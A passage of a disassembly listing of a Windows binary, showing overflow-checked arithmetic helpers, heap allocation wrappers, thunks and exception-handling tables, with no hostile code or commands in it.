; Attributes: bp-based frame

sub_1ADE0       proc near               ; CODE XREF: sub_1AFBF+1A↓p

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     eax, [ebp+arg_4]
                mul     [ebp+arg_8]
                test    edx, edx
                jnz     short loc_1ADFD
                cmp     eax, 0FFFFFFFFh
                ja      short loc_1ADFD
                mov     ecx, [ebp+arg_0]
                mov     [ecx], eax
                xor     eax, eax
                pop     ebp
                retn
; ---------------------------------------------------------------------------

loc_1ADFD:                              ; CODE XREF: sub_1ADE0+D↑j
                                        ; sub_1ADE0+12↑j
                mov     eax, 80070216h
                pop     ebp
                retn
sub_1ADE0       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_1AE09       proc near               ; CODE XREF: sub_1AFBF+2F↓p

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     ecx, [ebp+arg_4]
                mov     edx, [ebp+arg_8]
                or      eax, 0FFFFFFFFh
                sub     eax, ecx
                cmp     eax, edx
                jnb     short loc_1AE24
                mov     eax, 80070216h
                pop     ebp
                retn
; ---------------------------------------------------------------------------

loc_1AE24:                              ; CODE XREF: sub_1AE09+12↑j
                mov     eax, [ebp+arg_0]
                add     ecx, edx
                mov     [eax], ecx
                xor     eax, eax
                pop     ebp
                retn
sub_1AE09       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_1AE34       proc near               ; CODE XREF: sub_1AF3D+2F↓p

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     ecx, [ebp+arg_4]
                mov     edx, [ebp+arg_8]
                or      eax, 0FFFFFFFFh
                sub     eax, ecx
                cmp     eax, edx
                jnb     short loc_1AE4F
                mov     eax, 80070216h
                pop     ebp
                retn
; ---------------------------------------------------------------------------

loc_1AE4F:                              ; CODE XREF: sub_1AE34+12↑j
                mov     eax, [ebp+arg_0]
                add     ecx, edx
                mov     [eax], ecx
                xor     eax, eax
                pop     ebp
                retn
sub_1AE34       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================


sub_1AE5F       proc near               ; CODE XREF: sub_1AF17+8↓p
                cmp     byte ptr [ecx+8], 0
                mov     dword ptr [ecx], 100294Ch
                jz      short locret_1AE7A
                cmp     dword ptr [ecx+4], 0
                jz      short locret_1AE7A
                push    dword ptr [ecx+4]
                call    dword ptr ds:10010B8h

locret_1AE7A:                           ; CODE XREF: sub_1AE5F+A↑j
                                        ; sub_1AE5F+10↑j
                retn
sub_1AE5F       endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_1AE80       proc near

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    [ebp+arg_0]
                push    0
                push    dword ptr [ecx+4]
                call    dword ptr ds:10010B4h
                pop     ebp
                retn    4
sub_1AE80       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_1AE9C       proc near

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                cmp     [ebp+arg_0], 0
                jz      short loc_1AEB5
                push    [ebp+arg_0]
                push    0
                push    dword ptr [ecx+4]
                call    dword ptr ds:10010B0h

loc_1AEB5:                              ; CODE XREF: sub_1AE9C+9↑j
                pop     ebp
                retn    4
sub_1AE9C       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_1AEBE       proc near

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     edx, [ebp+arg_0]
                test    edx, edx
                jnz     short loc_1AED3
                push    [ebp+arg_4]
                mov     eax, [ecx]
                call    dword ptr [eax]
                jmp     short loc_1AEF2
; ---------------------------------------------------------------------------

loc_1AED3:                              ; CODE XREF: sub_1AEBE+A↑j
                cmp     [ebp+arg_4], 0
                jnz     short loc_1AEE3
                mov     eax, [ecx]
                push    edx
                call    dword ptr [eax+4]
                xor     eax, eax
                jmp     short loc_1AEF2
; ---------------------------------------------------------------------------

loc_1AEE3:                              ; CODE XREF: sub_1AEBE+19↑j
                push    [ebp+arg_4]
                push    edx
                push    0
                push    dword ptr [ecx+4]
                call    dword ptr ds:1001088h

loc_1AEF2:                              ; CODE XREF: sub_1AEBE+13↑j
                                        ; sub_1AEBE+23↑j
                pop     ebp
                retn    8
sub_1AEBE       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_1AEFB       proc near

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    [ebp+arg_0]
                push    0
                push    dword ptr [ecx+4]
                call    dword ptr ds:1001084h
                pop     ebp
                retn    4
sub_1AEFB       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_1AF17       proc near

arg_0           = byte ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    esi
                mov     esi, ecx
                call    sub_1AE5F
                test    [ebp+arg_0], 1
                jz      short loc_1AF31
                push    esi
                call    sub_16264
                pop     ecx

loc_1AF31:                              ; CODE XREF: sub_1AF17+11↑j
                mov     eax, esi
                pop     esi
                pop     ebp
                retn    4
sub_1AF17       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_1AF3D       proc near

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    esi
                mov     esi, [ebp+arg_0]
                push    edi
                push    [ebp+arg_4]
                add     esi, 8
                and     esi, 0FFFFFFF8h
                lea     eax, [ebp+arg_0]
                push    esi
                push    eax
                mov     edi, ecx
                call    sub_1ADB7
                add     esp, 0Ch
                test    eax, eax
                js      short loc_1AF9F
                push    [ebp+arg_0]
                lea     eax, [ebp+arg_0]
                push    10h
                push    eax
                call    sub_1AE34
                add     esp, 0Ch
                test    eax, eax
                js      short loc_1AF9F
                mov     ecx, [edi+4]
                push    [ebp+arg_0]
                mov     eax, [ecx]
                call    dword ptr [eax]
                mov     ecx, eax
                test    ecx, ecx
                jz      short loc_1AF9F
                and     dword ptr [ecx+4], 0
                lea     eax, [esi-1]
                mov     [ecx+8], eax
                mov     [ecx], edi
                mov     dword ptr [ecx+0Ch], 1
                mov     eax, ecx
                jmp     short loc_1AFA1
; ---------------------------------------------------------------------------

loc_1AF9F:                              ; CODE XREF: sub_1AF3D+24↑j
                                        ; sub_1AF3D+39↑j ...
                xor     eax, eax

loc_1AFA1:                              ; CODE XREF: sub_1AF3D+60↑j
                pop     edi
                pop     esi
                pop     ebp
                retn    8
sub_1AF3D       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_1AFAC       proc near
                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     ecx, [ecx+4]
                mov     eax, [ecx]
                pop     ebp
                jmp     dword ptr [eax+4]
sub_1AFAC       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_1AFBF       proc near

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    esi
                mov     esi, [ebp+arg_4]
                push    edi
                push    [ebp+arg_8]
                add     esi, 8
                and     esi, 0FFFFFFF8h
                lea     eax, [ebp+arg_4]
                push    esi
                push    eax
                mov     edi, ecx
                call    sub_1ADE0
                add     esp, 0Ch
                test    eax, eax
                js      short loc_1B018
                push    [ebp+arg_4]
                lea     eax, [ebp+arg_4]
                push    10h
                push    eax
                call    sub_1AE09
                add     esp, 0Ch
                test    eax, eax
                js      short loc_1B018
                push    [ebp+arg_4]
                mov     ecx, [edi+4]
                push    [ebp+arg_0]
                mov     eax, [ecx]
                call    dword ptr [eax+8]
                mov     ecx, eax
                test    ecx, ecx
                jz      short loc_1B018
                lea     eax, [esi-1]
                mov     [ecx+8], eax
                mov     eax, ecx
                jmp     short loc_1B01A
; ---------------------------------------------------------------------------

loc_1B018:                              ; CODE XREF: sub_1AFBF+24↑j
                                        ; sub_1AFBF+39↑j ...
                xor     eax, eax

loc_1B01A:                              ; CODE XREF: sub_1AFBF+57↑j
                pop     edi
                pop     esi
                pop     ebp
                retn    0Ch
sub_1AFBF       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)
; ---------------------------------------------------------------------------
                xor     edx, edx
                lea     eax, [ecx+14h]
                inc     edx
                lock xadd [eax], edx
                lea     eax, [ecx+8]
                retn
; ---------------------------------------------------------------------------
                align 8
                mov     eax, ecx
                retn
; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_1B040       proc near

arg_0           = byte ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                test    [ebp+arg_0], 1
                push    esi
                mov     esi, ecx
                mov     dword ptr [esi], 1002960h
                jz      short loc_1B05B
                push    esi
                call    sub_16264
                pop     ecx

loc_1B05B:                              ; CODE XREF: sub_1B040+12↑j
                mov     eax, esi
                pop     esi
                pop     ebp
                retn    4
sub_1B040       endp

; ---------------------------------------------------------------------------
                align 8

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_1B068       proc near               ; CODE XREF: sub_1700A+48B↑p
                jmp     dword ptr ds:10012ACh
sub_1B068       endp

; ---------------------------------------------------------------------------
                db 6 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_1B074       proc near               ; CODE XREF: sub_1700A+4AE↑p
                jmp     dword ptr ds:10012B0h
sub_1B074       endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_1B080       proc near               ; CODE XREF: sub_1700A+415↑p
                jmp     dword ptr ds:1001284h
sub_1B080       endp

; ---------------------------------------------------------------------------
                db 6 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_1B08C       proc near               ; CODE XREF: sub_1700A+462↑p
                jmp     dword ptr ds:1001280h
sub_1B08C       endp

; ---------------------------------------------------------------------------
                align 8

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_1B098       proc near               ; CODE XREF: sub_1B128+6↓j
                                        ; sub_1B138+13↓p

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     ecx, 100C758h
                call    sub_19028
                test    eax, eax
                jnz     short loc_1B0E8
                mov     ecx, 100C758h
                call    sub_192D8
                test    eax, eax
                jz      short loc_1B0E8
                push    1228h
                push    0
                push    100C768h
                call    sub_16746
                add     esp, 0Ch
                mov     ecx, 100C768h
                call    sub_18778
                push    0
                mov     ecx, 100C758h
                mov     ds:100C760h, eax
                call    sub_19328

loc_1B0E8:                              ; CODE XREF: sub_1B098+11↑j
                                        ; sub_1B098+1F↑j
                push    esi
                mov     ecx, 100C758h
                call    sub_19048
                mov     ecx, [ebp+arg_0]
                mov     esi, eax
                test    esi, esi
                jl      short loc_1B112
                mov     eax, ds:100C760h
                mov     [ecx], eax
                mov     edx, [eax]
                push    eax
                mov     eax, [edx+4]
                call    eax
                mov     eax, esi
                pop     esi
                pop     ebp
                retn    4
; ---------------------------------------------------------------------------

loc_1B112:                              ; CODE XREF: sub_1B098+62↑j
                mov     eax, esi
                mov     dword ptr [ecx], 0
                pop     esi
                pop     ebp
                retn    4
sub_1B098       endp

; ---------------------------------------------------------------------------
                db 9 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_1B128       proc near
                mov     edi, edi
                push    ebp
                mov     ebp, esp
                pop     ebp
                jmp     sub_1B098
sub_1B128       endp

; ---------------------------------------------------------------------------
                align 8

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_1B138       proc near

var_4           = dword ptr -4
arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    ecx
                push    ebx
                push    esi
                lea     eax, [ebp+var_4]
                push    eax
                mov     [ebp+var_4], 0
                call    sub_1B098
                mov     ebx, [ebp+arg_0]
                mov     esi, eax
                test    esi, esi
                jnz     short loc_1B16F
                push    edi
                mov     edi, [ebp+var_4]
                push    ebx
                push    edi
                call    sub_17D28
                mov     ecx, [edi]
                mov     edx, [ecx+8]
                push    edi
                mov     esi, eax
                call    edx
                pop     edi

loc_1B16F:                              ; CODE XREF: sub_1B138+1F↑j
                push    8000h
                push    0
                push    ebx
                call    dword ptr ds:1001170h
                mov     eax, esi
                pop     esi
                pop     ebx
                mov     esp, ebp
                pop     ebp
                retn    4
sub_1B138       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)
; ---------------------------------------------------------------------------
                lea     ecx, [ebp-230h]
                jmp     loc_141D3
; ---------------------------------------------------------------------------
                lea     ecx, [ebp-220h]
                jmp     loc_14265
; ---------------------------------------------------------------------------
                lea     ecx, [ebp-224h]
                jmp     loc_14265
; ---------------------------------------------------------------------------
                lea     ecx, [ebp-21Ch]
                jmp     loc_148F4
; ---------------------------------------------------------------------------
                mov     edx, [esp+8]
                lea     eax, [edx+0Ch]
                mov     ecx, [edx-234h]
                xor     ecx, eax
                call    sub_165AB
                mov     ecx, [edx-4]
                xor     ecx, eax
                call    sub_165AB
                mov     eax, 100A798h
                jmp     loc_16704
; ---------------------------------------------------------------------------
                db 5 dup(0CCh)
; ---------------------------------------------------------------------------
                push    dword ptr [ebp-2Ch]
                call    sub_165A0
                pop     ecx
                retn
; ---------------------------------------------------------------------------
                lea     ecx, [ebp-14h]
                jmp     loc_139CA
; ---------------------------------------------------------------------------
                mov     edx, [esp+8]
                lea     eax, [edx+0Ch]
                mov     ecx, [edx-30h]
                xor     ecx, eax
                call    sub_165AB
                mov     eax, 100A800h
                jmp     loc_16704
; ---------------------------------------------------------------------------
                db 5 dup(0CCh)
; ---------------------------------------------------------------------------
                mov     edx, [esp+8]
                lea     eax, [edx+0Ch]
                mov     ecx, [edx-1Ch]
                xor     ecx, eax
                call    sub_165AB
                mov     eax, 100A858h
                jmp     loc_16704
; ---------------------------------------------------------------------------
                db 5 dup(0CCh)
; ---------------------------------------------------------------------------
                mov     edx, [esp+8]
                lea     eax, [edx+0Ch]
                mov     ecx, [edx-1Ch]
                xor     ecx, eax
                call    sub_165AB
                mov     eax, 100A8D0h
                jmp     loc_16704
; ---------------------------------------------------------------------------
                db 5 dup(0CCh)
; ---------------------------------------------------------------------------
                mov     edx, [esp+8]
                lea     eax, [edx+0Ch]
                mov     ecx, [edx-1Ch]
                xor     ecx, eax
                call    sub_165AB
                mov     eax, 100A928h
                jmp     loc_16704
; ---------------------------------------------------------------------------
                db 5 dup(0CCh)
; ---------------------------------------------------------------------------
                mov     ecx, [ebp-10h]
                jmp     loc_15C7B
; ---------------------------------------------------------------------------
                mov     edx, [esp+8]
                lea     eax, [edx+0Ch]
                mov     ecx, [edx-14h]
                xor     ecx, eax
                call    sub_165AB
                mov     eax, 100A988h
                jmp     loc_16704
; ---------------------------------------------------------------------------
                db 5 dup(0CCh)
; ---------------------------------------------------------------------------
                lea     ecx, [ebp-10h]
                jmp     dword ptr ds:100117Ch
; ---------------------------------------------------------------------------
                mov     edx, [esp+8]
                lea     eax, [edx+0Ch]
                mov     ecx, [edx-14h]
                xor     ecx, eax
                call    sub_165AB
                mov     eax, 100AD2Ch
                jmp     loc_16704
; ---------------------------------------------------------------------------
                align 8
                mov     ecx, 100C320h
                call    sub_14F39
                push    100A721h
                mov     dword ptr ds:100C320h, 10015E8h
                mov     byte ptr ds:100C360h, 0
                call    sub_16461
                pop     ecx
                retn
; ---------------------------------------------------------------------------
                db 5 dup(0CCh)
; ---------------------------------------------------------------------------
                mov     ecx, 100C6CCh
                call    sub_16BDD
                push    100A730h
                call    sub_16461
                pop     ecx
                retn
; ---------------------------------------------------------------------------
                db 5 dup(0CCh)
; ---------------------------------------------------------------------------
                mov     ecx, 100C704h
                call    sub_16C5D
                push    100A73Fh
                call    sub_16461
                pop     ecx
                retn
; ---------------------------------------------------------------------------
                db 5 dup(0CCh)
; ---------------------------------------------------------------------------
                push    100A74Eh
                call    sub_16461
                pop     ecx
                retn
; ---------------------------------------------------------------------------
                db 5 dup(0CCh)
; ---------------------------------------------------------------------------
                call    dword ptr ds:1001080h
                push    100A75Dh
                mov     dword ptr ds:100C74Ch, 100294Ch
                mov     ds:100C750h, eax
                mov     byte ptr ds:100C754h, 0
                call    sub_16461
                pop     ecx
                retn
; ---------------------------------------------------------------------------
                align 8
                push    100A76Ch
                call    sub_16461
                pop     ecx
                retn
; ---------------------------------------------------------------------------
                db 5 dup(0CCh)
; ---------------------------------------------------------------------------
                mov     ecx, 100C320h
                jmp     sub_14F7B
; ---------------------------------------------------------------------------
                align 8
                dd 0C6CCB9h, 0B890E901h, 0CCCCFFFFh, 0B9CCCCCCh, 100C704h
                dd 0FF8A55E9h, 0CCCCCCFFh, 48B9CCCCh, 0E90100C7h, 0FFFFF9B3h
                dd 0CCCCCCCCh, 0C74CB9CCh, 0A0E90100h, 0CCFFFFFAh, 0CCCCCCCCh
                dd 0C0C005C7h, 29600100h, 0CCC30100h, 0FFFFFFFFh, 100A534h
                dd 0
                dd 100A53Fh, 1, 100A54Ah, 2, 100A555h, 19930522h, 4, 100A778h
                dd 5 dup(0)
                dd 1, 40h, 2 dup(0)
                dd 1003BA6h, 0
                dd 1, 2, 1, 100A7BCh, 0FFFFFFFFh, 2 dup(0)
                dd 100A58Dh, 0FFFFFFFFh, 0
                dd 0FFFFFFFFh, 100A597h, 19930522h, 4, 100A7E0h, 1, 100A7CCh
                dd 3 dup(0)
                dd 1, 40h, 2 dup(0)
                dd 1002B13h, 0FFFFFFFFh, 0
                dd 0FFFFFFFFh, 3 dup(0)
                dd 2 dup(1), 100A824h, 19930522h, 2, 100A834h, 1, 100A844h
                dd 3 dup(0)
                dd 1, 0
                dd 0FFFFFFE4h, 0
                dd 0FFFFF9ACh, 0
                dd 0FFFFFFFEh, 0
                dd 10040A3h, 40h, 2 dup(0)
                dd 1004963h, 0FFFFFFFFh, 0
                dd 0FFFFFFFFh, 3 dup(0)
                dd 2 dup(1), 100A89Ch, 19930522h, 2, 100A8ACh, 1, 100A8BCh
                dd 3 dup(0)
                dd 1, 40h, 2 dup(0)
                dd 1004AE7h, 0FFFFFFFFh, 0
                dd 0FFFFFFFFh, 3 dup(0)
                dd 2 dup(1), 100A8F4h, 19930522h, 2, 100A904h, 1, 100A914h
                dd 3 dup(0)
                dd 1, 3 dup(0)
                dd 100A95Ch, 1, 100A964h, 0
                dd 100C030h, 0
                dd 0FFFFFFFFh, 0
                dd 4, 0
                dd 0FFFFFFFFh, 100A61Fh, 19930522h, 1, 100A980h, 5 dup(0)
                dd 1, 0
                dd 0FFFFFFFEh, 0
                dd 0FFFFFF84h, 0
                dd 0FFFFFFFEh, 10054E9h, 10054FDh, 0
                dd 0FFFFFFFEh, 0
                dd 0FFFFFFD0h, 0
                dd 0FFFFFFFEh, 0
                dd 1005664h, 0
                dd 0FFFFFFFEh, 0
                db 0CCh
                db 3 dup(0FFh)
                align 8
                dd 0FFFFFFFEh, 10056A4h, 10056CDh, 0
                dd 0FFFFFFFEh, 0
                dd 0FFFFFFD4h, 0
                dd 0FFFFFFFEh, 0
                dd 100572Fh, 0
                dd 0FFFFFFFEh, 0
                db 0CCh
                db 3 dup(0FFh)
                align 8
                dd 0FFFFFFFEh, 0
                dd 10057FBh, 0
                dd 0FFFFFFFEh, 0
                dd 0FFFFFFD8h, 0
                dd 0FFFFFFFEh, 1005D3Bh, 1005D4Eh, 0
                dd 0FFFFFFFEh, 0
                dd 0FFFFFFD4h, 0
                dd 0FFFFFFFEh, 1006FA5h, 1006FB5h, 0
                dd 0FFFFFFFEh, 0
                dd 0FFFFFFC0h, 0
                dd 0FFFFFFFEh, 100729Ch, 10072ACh, 0
                dd 1007230h, 1007240h, 0FFFFFFFEh, 0
                dd 0FFFFFFD0h, 0
                dd 0FFFFFFFEh, 10073C3h, 10073D3h, 0
                dd 0FFFFFFFEh, 0
                db 0CCh
                db 3 dup(0FFh)
                align 10h
                dd 0FFFFFFFEh, 1007511h, 1007521h, 0
                dd 0FFFFFFFEh, 0
                dd 0FFFFFFC0h, 0
                dd 0FFFFFFFEh, 100780Ch, 100781Ch, 0
                dd 0FFFFFFFEh, 0
                dd 0FFFFFFD0h, 0
                dd 0FFFFFFFEh, 1007A02h, 1007A12h, 0
                dd 0FFFFFFFEh, 0
                dd 0FFFFFFC4h, 0
                dd 0FFFFFFFEh, 1007EAEh, 1007EBEh, 0
                dd 0FFFFFFFEh, 0
                db 0CCh
                db 3 dup(0FFh)
                align 10h
                dd 0FFFFFFFEh, 1007FB1h, 1007FC1h, 0
                dd 0FFFFFFFEh, 0
                dd 0FFFFFFD0h, 0
                dd 0FFFFFFFEh, 10080ABh, 10080BBh, 0
                dd 0FFFFFFFEh, 0
                dd 0FFFFFFD4h, 0
                dd 0FFFFFFFEh, 100815Dh, 100816Dh, 0
                dd 0FFFFFFFEh, 0
                dd 0FFFFFFD0h, 0
                dd 0FFFFFFFEh, 1008206h, 1008216h, 0
                dd 0FFFFFFFEh, 0
                dd 0FFFFFFD4h, 0
                dd 0FFFFFFFEh, 10082B4h, 10082C4h, 0
                dd 0FFFFFFFEh, 0
                dd 0FFFFFFD0h, 0
                dd 0FFFFFFFEh, 100861Ah, 100862Ah, 0
                dd 0FFFFFFFEh, 0
                dd 0FFFFFFC4h, 0
                dd 0FFFFFFFEh, 1008F01h, 1008F11h, 0FFFFFFFEh, 1008F64h
                dd 1008F74h, 0FFFFFFFEh, 0
                dd 0FFFFFFD0h, 0
                dd 0FFFFFFFEh, 10092DDh, 10092EDh, 0
                dd 0FFFFFFFEh, 0
                dd 0FFFFFFD0h, 0
                dd 0FFFFFFFEh, 10094C2h, 10094D2h, 0
                dd 0FFFFFFFEh, 0
                dd 0FFFFFFD0h, 0
                dd 0FFFFFFFEh, 10098A7h, 10098B7h, 0
                dd 0FFFFFFFEh, 0
                dd 0FFFFFFD0h, 0
                dd 0FFFFFFFEh, 1009A1Bh, 1009A2Bh, 0
                dd 0FFFFFFFEh, 0
                dd 0FFFFFFB8h, 0
                dd 0FFFFFFFEh, 1009D94h, 1009DA4h, 0
                dd 1009CE5h, 1009CF5h, 0FFFFFFFEh, 0
                db 0CCh
                db 3 dup(0FFh)
                align 10h
                dd 0FFFFFFFEh, 1009EE6h, 1009EF6h, 0
                dd 0FFFFFFFEh, 0
                dd 0FFFFFFD4h, 0
                dd 0FFFFFFFEh, 100A083h, 100A094h, 0FFFFFFFFh, 100A647h
                dd 19930522h, 1, 100AD24h, 5 dup(0)
                dd 1, 0
                dd 100C000h, 0
                dd 0AE38h, 2 dup(0)
                dd 0B142h, 1000h, 0AE7Ch, 2 dup(0)
                dd 0B384h, 1044h, 0B0C4h, 2 dup(0)
                dd 0B406h, 128Ch, 0AFC0h, 2 dup(0)
                dd 0B59Ch, 1188h, 0AE48h, 2 dup(0)
                dd 0B670h, 1010h, 0B0F0h, 2 dup(0)
                dd 0B70Eh, 12B8h, 0B074h, 2 dup(0)
                dd 0B718h, 123Ch, 0AFB0h, 2 dup(0)
                dd 0BB00h, 1178h, 0B0E4h
CODE            ends


                end
